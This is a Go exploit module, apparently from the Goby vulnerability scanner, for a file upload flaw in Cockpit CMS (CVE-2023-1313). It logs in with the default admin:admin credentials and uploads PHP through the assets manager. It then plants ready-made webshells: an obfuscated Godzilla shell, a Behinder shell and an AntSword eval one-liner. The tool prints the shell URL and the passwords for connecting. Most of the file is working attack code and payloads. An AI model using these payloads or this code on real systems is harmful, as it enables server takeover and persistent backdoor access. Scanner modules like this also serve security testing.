package exploits

import (
	"errors"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Cockpit assetsmanager/upload file upload vulnerability (CVE-2023-1313)",
    "Description": "<p>Cockpit is a self-hosted, flexible and user-friendly headless content platform for creating custom digital experiences.</p><p>Cockpit has a file upload vulnerability, which allows attackers to upload arbitrary files, leading to server control, etc.</p>",
    "Product": "cockpit",
    "Homepage": "http://getcockpit.com",
    "DisclosureDate": "2023-03-10",
    "Author": "sunying",
    "FofaQuery": "title=\"Authenticate Please!\" || body=\"password:this.refs.password.value\" || body=\"UIkit.components.formPassword.prototype.defaults.lblShow\" || body=\"App.request('/auth/check'\"",
    "GobyQuery": "title=\"Authenticate Please!\" || body=\"password:this.refs.password.value\" || body=\"UIkit.components.formPassword.prototype.defaults.lblShow\" || body=\"App.request('/auth/check'\"",
    "Level": "2",
    "Impact": "<p>Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"https://github.com/cockpit-hq/cockpit\">https://github.com/cockpit-hq/cockpit</a></p>",
    "References": [
        "https://huntr.dev/bounties/f73eef49-004f-4b3b-9717-90525e65ba61/"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "webshell",
            "show": ""
        },
        {
            "name": "webshell",
            "type": "select",
            "value": "antsword,godzilla,behinder,custom",
            "show": "attackType=webshell"
        },
        {
            "name": "content",
            "type": "textarea",
            "value": "<?php echo \"hello\"; ?>",
            "show": "attackType=webshell,webshell=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Upload"
    ],
    "VulType": [
        "File Upload"
    ],
    "CVEIDs": [
        "CVE-2023-1313"
    ],
    "CNNVD": [
        "CNNVD-202303-731"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.2",
    "Translation": {
        "CN": {
            "Name": "Cockpit assetsmanager/upload 文件上传漏洞（CVE-2023-1313）",
            "Product": "cockpit",
            "Description": "<p>Cockpit 是一个自托管、灵活且用户友好的无头内容平台，用于创建自定义数字体验。</p><p>Cockpit 存在文件上传漏洞，<span style=\"color: rgb(22, 28, 37); font-size: 16px;\">攻击者可通过该漏洞在服务器端任意上传代码，写入后门，获取服务器权限，进而控制整个web服务器。</span></p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://github.com/cockpit-hq/cockpit\">https://github.com/cockpit-hq/cockpit</a><br></p>",
            "Impact": "<p>攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。\t<br></p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "Cockpit assetsmanager/upload file upload vulnerability (CVE-2023-1313)",
            "Product": "cockpit",
            "Description": "<p>Cockpit is a self-hosted, flexible and user-friendly headless content platform for creating custom digital experiences.</p><p>Cockpit has a file upload vulnerability, which allows attackers to upload arbitrary files, leading to server control, etc.<br></p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"https://github.com/cockpit-hq/cockpit\">https://github.com/cockpit-hq/cockpit</a><br></p>",
            "Impact": "<p>Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.<br></p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2023-09-26",
    "PocId": "10765"
}`

	getCsfrStringGR4ho9YF := func(hostInfo *httpclient.FixUrl) (string, error) {
		getCsfrConfig := httpclient.NewGetRequestConfig("/auth/login?to=/")
		getCsfrConfig.VerifyTls = false
		getCsfrConfig.FollowRedirect = false
		resp, err := httpclient.DoHttpRequest(hostInfo, getCsfrConfig)
		if err != nil {
			return "", err
		} else if resp.StatusCode == 200 && len(regexp.MustCompile(`csfr\s*:\s*"(.+?)"`).FindStringSubmatch(resp.RawBody)) > 1 {
			return regexp.MustCompile(`csfr\s*:\s*"(.+?)"`).FindStringSubmatch(resp.RawBody)[1], nil
		}
		return "", errors.New("漏洞利用失败")
	}

	getAdminCookieGR4ho9YF := func(hostInfo *httpclient.FixUrl) (string, error) {
		csrf, err := getCsfrStringGR4ho9YF(hostInfo)
		if err != nil {
			return "", err
		}
		adminCheckConfig := httpclient.NewPostRequestConfig("/auth/check")
		adminCheckConfig.VerifyTls = false
		adminCheckConfig.FollowRedirect = false
		adminCheckConfig.Header.Store("Content-Type", "application/json")
		adminCheckConfig.Data = `{"auth":{"user":"admin","password":"admin"},"csfr":"` + csrf + `"}`
		resp, err := httpclient.DoHttpRequest(hostInfo, adminCheckConfig)
		if err != nil {
			return "", err
		} else if resp.StatusCode == 200 && strings.Contains(resp.RawBody, `"success":true`) {
			return resp.Cookie, nil
		}
		return "", errors.New("漏洞利用失败")
	}

	uploadPayloadGR4ho9YF := func(hostInfo *httpclient.FixUrl, filename, payload string) (*httpclient.HttpResponse, error) {
		cookie, err := getAdminCookieGR4ho9YF(hostInfo)
		if err != nil {
			return nil, err
		}
		boundaryString := "---------------------------" + goutils.RandomHexString(20)
		uploadFileConfig := httpclient.NewPostRequestConfig("/assetsmanager/upload")
		uploadFileConfig.VerifyTls = false
		uploadFileConfig.FollowRedirect = false
		uploadFileConfig.Header.Store("Cookie", cookie)
		uploadFileConfig.Header.Store("Content-Type", "multipart/form-data; boundary="+boundaryString)
		uploadFileConfig.Data += "--" + boundaryString + "\r\n"
		uploadFileConfig.Data += "Content-Disposition: form-data; name=\"files[]\"; filename=\"" + filename + "\"\n"
		uploadFileConfig.Data += "Content-Type: text/php\r\n\r\n"
		uploadFileConfig.Data += payload + "\r\n"
		uploadFileConfig.Data += "--" + boundaryString + "\r\n"
		uploadFileConfig.Data += "Content-Disposition: form-data; name=\"folder\"\r\n\r\n\r\n"
		uploadFileConfig.Data += "--" + boundaryString + "--"
		return httpclient.DoHttpRequest(hostInfo, uploadFileConfig)
	}

	getPathGR4ho9YF := func(hostInfo *httpclient.FixUrl, filename, payload string) (string, error) {
		resp, err := uploadPayloadGR4ho9YF(hostInfo, filename, payload)
		if err != nil {
			return "", err
		} else if resp.StatusCode == 200 && len(regexp.MustCompile(`"path":"(.+?)"`).FindStringSubmatch(resp.RawBody)) > 1 {
			return strings.ReplaceAll(regexp.MustCompile(`"path":"(.+?)"`).FindStringSubmatch(resp.RawBody)[1], "\\", ""), nil
		}
		return "", errors.New("漏洞利用失败")
	}

	checkUploadFileGR4ho9YF := func(hostInfo *httpclient.FixUrl, filename, payload string) (*httpclient.HttpResponse, error) {
		filePath, err := getPathGR4ho9YF(hostInfo, filename, payload)
		if err != nil {
			return nil, errors.New("漏洞利用失败")
		}
		checkUploadConfig := httpclient.NewGetRequestConfig("/storage/uploads/" + filePath)
		checkUploadConfig.VerifyTls = false
		checkUploadConfig.FollowRedirect = false
		return httpclient.DoHttpRequest(hostInfo, checkUploadConfig)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(poc *jsonvul.JsonVul, hostinfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			randFilename := goutils.RandomHexString(6) + ".php"
			randStr := goutils.RandomHexString(16)
			respPoc, _ := checkUploadFileGR4ho9YF(hostinfo, randFilename, "<?php echo \""+randStr+"\";unlink(__FILE__);?>")
			return respPoc != nil && respPoc.StatusCode == 200 && strings.Contains(respPoc.RawBody, randStr)
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(stepLogs.Params["attackType"])
			if attackType != "webshell" {
				expResult.Success = false
				expResult.Output = "未知的攻击方式"
				return expResult
			} else if attackType == "webshell" {
				webshell := goutils.B2S(stepLogs.Params["webshell"])
				content := goutils.B2S(stepLogs.Params["content"])
				filename := goutils.RandomHexString(6) + ".php"
				if webshell == "godzilla" {
					content = "<?php @session_start();@set_time_limit(0);@error_reporting(0);function encode($D,$K){for($i=0;$i<strlen($D);$i++){$c=$K[$i+1&15];$D[$i]=$D[$i]^$c;}return $D;}$pass='pass';$payloadName='payload';$key='3c6e0b8a9c15224a';if(isset($_POST[$pass])){$data=encode(base64_decode($_POST[$pass]),$key);if(isset($_SESSION[$payloadName])){$payload=encode($_SESSION[$payloadName],$key);if(strpos($payload,\"getBasicsInfo\")===false){$payload=encode($payload,$key);}eval($payload);echo substr(md5($pass.$key),0,16);echo base64_encode(encode(@run($data),$key));echo substr(md5($pass.$key),16);}else{if(strpos($data,\"getBasicsInfo\")!==false){$_SESSION[$payloadName]=encode($data,$key);}}}?>"
				} else if webshell == "behinder" {
					content = "<?php @error_reporting(0);session_start();$key=\"e45e329feb5d925b\";$_SESSION['k']=$key;session_write_close();$post=file_get_contents(\"php://input\");if(!extension_loaded('openssl')){$t=\"base64_\".\"decode\";$post=$t($post.\"\");for($i=0;$i<strlen($post);$i++){$post[$i]=$post[$i]^$key[$i+1&15];}}else{$post=openssl_decrypt($post,\"AES128\",$key);}$arr=explode('|',$post);$func=$arr[0];$params=$arr[1];class C{public function __invoke($p){eval($p.\"\");}}@call_user_func(new C(),$params);?>"
				} else if webshell == "antsword" {
					content = "<?php @eval($_POST['passwd']);?>"
				} else if webshell == "custom" {
					content = goutils.B2S(stepLogs.Params["content"])
				} else {
					expResult.Success = false
					expResult.Output = `未知的的利用方式`
					return expResult
				}
				respWebshell, errWebshell := checkUploadFileGR4ho9YF(expResult.HostInfo, filename, content)
				if errWebshell != nil {
					expResult.Success = false
					expResult.Output = errWebshell.Error()
					return expResult
				} else if respWebshell != nil && respWebshell.StatusCode != 200 && respWebshell.StatusCode != 500 {
					expResult.Success = false
					expResult.Output = `漏洞利用失败`
					return expResult
				}
				expResult.Success = true
				expResult.Output = "WebShell URL: " + expResult.HostInfo.FixedHostInfo + respWebshell.Request.URL.Path + "\n"
				if webshell == "godzilla" {
					expResult.Output += "密码: pass 密钥：key 加密器：PHP_XOR_BASE64\n"
					expResult.Output += "WebShell tool: Godzilla v4.1\n"
				} else if webshell == "behinder" {
					expResult.Output += "Password: rebeyond\n"
					expResult.Output += "WebShell tool: Behinder v3.0\n"
				} else if webshell == "antsword" {
					expResult.Output += "密码: passwd  编码器：default\n"
					expResult.Output += "WebShell tool: AntSword v4.0\n"
				}
				expResult.Output += "Webshell type: php"
			} else {
				expResult.Success = false
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
